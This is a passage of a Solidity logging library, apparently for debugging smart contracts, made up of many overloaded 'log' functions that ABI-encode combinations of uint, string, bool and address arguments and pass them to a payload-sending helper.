    | 	function log(uint p0, address p1) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address)", p0, p1));
    | 	}
    | 
    | 	function log(string memory p0, uint p1) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint)", p0, p1));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string)", p0, p1));
    | 	}
    | 
    | 	function log(string memory p0, bool p1) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool)", p0, p1));
    | 	}
    | 
    | 	function log(string memory p0, address p1) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address)", p0, p1));
    | 	}
    | 
    | 	function log(bool p0, uint p1) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint)", p0, p1));
    | 	}
    | 
    | 	function log(bool p0, string memory p1) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string)", p0, p1));
    | 	}
    | 
    | 	function log(bool p0, bool p1) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool)", p0, p1));
    | 	}
    | 
    | 	function log(bool p0, address p1) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address)", p0, p1));
    | 	}
    | 
    | 	function log(address p0, uint p1) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint)", p0, p1));
    | 	}
    | 
    | 	function log(address p0, string memory p1) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string)", p0, p1));
    | 	}
    | 
    | 	function log(address p0, bool p1) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool)", p0, p1));
    | 	}
    | 
    | 	function log(address p0, address p1) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address)", p0, p1));
    | 	}
    | 
    | 	function log(uint p0, uint p1, uint p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,uint)", p0, p1, p2));
    | 	}
    | 
    | 	function log(uint p0, uint p1, string memory p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,string)", p0, p1, p2));
    | 	}
    | 
    | 	function log(uint p0, uint p1, bool p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,bool)", p0, p1, p2));
    | 	}
    | 
    | 	function log(uint p0, uint p1, address p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,address)", p0, p1, p2));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, uint p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,uint)", p0, p1, p2));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, string memory p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,string)", p0, p1, p2));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, bool p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,bool)", p0, p1, p2));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, address p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,address)", p0, p1, p2));
    | 	}
    | 
    | 	function log(uint p0, bool p1, uint p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,uint)", p0, p1, p2));
    | 	}
    | 
    | 	function log(uint p0, bool p1, string memory p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,string)", p0, p1, p2));
    | 	}
    | 
    | 	function log(uint p0, bool p1, bool p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,bool)", p0, p1, p2));
    | 	}
    | 
    | 	function log(uint p0, bool p1, address p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,address)", p0, p1, p2));
    | 	}
    | 
    | 	function log(uint p0, address p1, uint p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,uint)", p0, p1, p2));
    | 	}
    | 
    | 	function log(uint p0, address p1, string memory p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,string)", p0, p1, p2));
    | 	}
    | 
    | 	function log(uint p0, address p1, bool p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,bool)", p0, p1, p2));
    | 	}
    | 
    | 	function log(uint p0, address p1, address p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,address)", p0, p1, p2));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, uint p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,uint)", p0, p1, p2));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, string memory p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,string)", p0, p1, p2));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, bool p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,bool)", p0, p1, p2));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, address p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,address)", p0, p1, p2));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, uint p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,uint)", p0, p1, p2));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, string memory p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,string)", p0, p1, p2));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, bool p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,bool)", p0, p1, p2));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, address p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,address)", p0, p1, p2));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, uint p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,uint)", p0, p1, p2));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, string memory p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,string)", p0, p1, p2));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, bool p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,bool)", p0, p1, p2));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, address p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,address)", p0, p1, p2));
    | 	}
    | 
    | 	function log(string memory p0, address p1, uint p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,uint)", p0, p1, p2));
    | 	}
    | 
    | 	function log(string memory p0, address p1, string memory p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,string)", p0, p1, p2));
    | 	}
    | 
    | 	function log(string memory p0, address p1, bool p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,bool)", p0, p1, p2));
    | 	}
    | 
    | 	function log(string memory p0, address p1, address p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,address)", p0, p1, p2));
    | 	}
    | 
    | 	function log(bool p0, uint p1, uint p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,uint)", p0, p1, p2));
    | 	}
    | 
    | 	function log(bool p0, uint p1, string memory p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,string)", p0, p1, p2));
    | 	}
    | 
    | 	function log(bool p0, uint p1, bool p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,bool)", p0, p1, p2));
    | 	}
    | 
    | 	function log(bool p0, uint p1, address p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,address)", p0, p1, p2));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, uint p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,uint)", p0, p1, p2));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, string memory p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,string)", p0, p1, p2));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, bool p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,bool)", p0, p1, p2));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, address p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,address)", p0, p1, p2));
    | 	}
    | 
    | 	function log(bool p0, bool p1, uint p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,uint)", p0, p1, p2));
    | 	}
    | 
    | 	function log(bool p0, bool p1, string memory p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,string)", p0, p1, p2));
    | 	}
    | 
    | 	function log(bool p0, bool p1, bool p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,bool)", p0, p1, p2));
    | 	}
    | 
    | 	function log(bool p0, bool p1, address p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,address)", p0, p1, p2));
    | 	}
    | 
    | 	function log(bool p0, address p1, uint p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,uint)", p0, p1, p2));
    | 	}
    | 
    | 	function log(bool p0, address p1, string memory p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,string)", p0, p1, p2));
    | 	}
    | 
    | 	function log(bool p0, address p1, bool p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,bool)", p0, p1, p2));
    | 	}
    | 
    | 	function log(bool p0, address p1, address p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,address)", p0, p1, p2));
    | 	}
    | 
    | 	function log(address p0, uint p1, uint p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,uint)", p0, p1, p2));
    | 	}
    | 
    | 	function log(address p0, uint p1, string memory p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,string)", p0, p1, p2));
    | 	}
    | 
    | 	function log(address p0, uint p1, bool p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,bool)", p0, p1, p2));
    | 	}
    | 
    | 	function log(address p0, uint p1, address p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,address)", p0, p1, p2));
    | 	}
    | 
    | 	function log(address p0, string memory p1, uint p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,uint)", p0, p1, p2));
    | 	}
    | 
    | 	function log(address p0, string memory p1, string memory p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,string)", p0, p1, p2));
    | 	}
    | 
    | 	function log(address p0, string memory p1, bool p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,bool)", p0, p1, p2));
    | 	}
    | 
    | 	function log(address p0, string memory p1, address p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,address)", p0, p1, p2));
    | 	}
    | 
    | 	function log(address p0, bool p1, uint p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,uint)", p0, p1, p2));
    | 	}
    | 
    | 	function log(address p0, bool p1, string memory p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,string)", p0, p1, p2));
    | 	}
    | 
    | 	function log(address p0, bool p1, bool p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,bool)", p0, p1, p2));
    | 	}
    | 
    | 	function log(address p0, bool p1, address p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,address)", p0, p1, p2));
    | 	}
    | 
    | 	function log(address p0, address p1, uint p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,uint)", p0, p1, p2));
    | 	}
    | 
    | 	function log(address p0, address p1, string memory p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,string)", p0, p1, p2));
    | 	}
    | 
    | 	function log(address p0, address p1, bool p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,bool)", p0, p1, p2));
    | 	}
    | 
    | 	function log(address p0, address p1, address p2) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,address)", p0, p1, p2));
    | 	}
    | 
    | 	function log(uint p0, uint p1, uint p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,uint,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, uint p1, uint p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,uint,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, uint p1, uint p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,uint,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, uint p1, uint p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,uint,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, uint p1, string memory p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,string,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, uint p1, string memory p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,string,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, uint p1, string memory p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,string,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, uint p1, string memory p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,string,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, uint p1, bool p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,bool,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, uint p1, bool p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,bool,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, uint p1, bool p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,bool,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, uint p1, bool p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,bool,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, uint p1, address p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,address,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, uint p1, address p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,address,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, uint p1, address p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,address,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, uint p1, address p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint,address,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, uint p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,uint,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, uint p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,uint,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, uint p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,uint,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, uint p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,uint,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, string memory p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,string,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, string memory p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,string,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, string memory p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,string,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, string memory p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,string,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, bool p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,bool,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, bool p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,bool,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, bool p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,bool,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, bool p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,bool,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, address p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,address,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, address p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,address,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, address p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,address,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, string memory p1, address p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string,address,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, bool p1, uint p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,uint,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, bool p1, uint p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,uint,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, bool p1, uint p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,uint,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, bool p1, uint p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,uint,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, bool p1, string memory p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,string,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, bool p1, string memory p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,string,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, bool p1, string memory p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,string,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, bool p1, string memory p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,string,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, bool p1, bool p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,bool,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, bool p1, bool p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,bool,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, bool p1, bool p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,bool,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, bool p1, bool p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,bool,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, bool p1, address p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,address,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, bool p1, address p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,address,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, bool p1, address p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,address,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, bool p1, address p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool,address,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, address p1, uint p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,uint,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, address p1, uint p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,uint,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, address p1, uint p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,uint,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, address p1, uint p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,uint,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, address p1, string memory p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,string,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, address p1, string memory p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,string,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, address p1, string memory p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,string,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, address p1, string memory p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,string,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, address p1, bool p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,bool,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, address p1, bool p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,bool,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, address p1, bool p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,bool,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, address p1, bool p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,bool,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, address p1, address p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,address,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, address p1, address p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,address,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, address p1, address p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,address,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(uint p0, address p1, address p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,address,address,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, uint p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,uint,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, uint p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,uint,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, uint p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,uint,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, uint p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,uint,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, string memory p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,string,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, string memory p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,string,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, string memory p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,string,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, string memory p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,string,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, bool p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,bool,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, bool p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,bool,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, bool p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,bool,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, bool p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,bool,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, address p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,address,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, address p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,address,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, address p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,address,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, uint p1, address p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,uint,address,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, uint p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,uint,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, uint p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,uint,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, uint p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,uint,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, uint p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,uint,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, string memory p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,string,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, string memory p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,string,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, string memory p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,string,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, string memory p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,string,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, bool p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,bool,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, bool p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,bool,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, bool p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,bool,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, bool p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,bool,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, address p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,address,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, address p2, string memory p3) internal view {
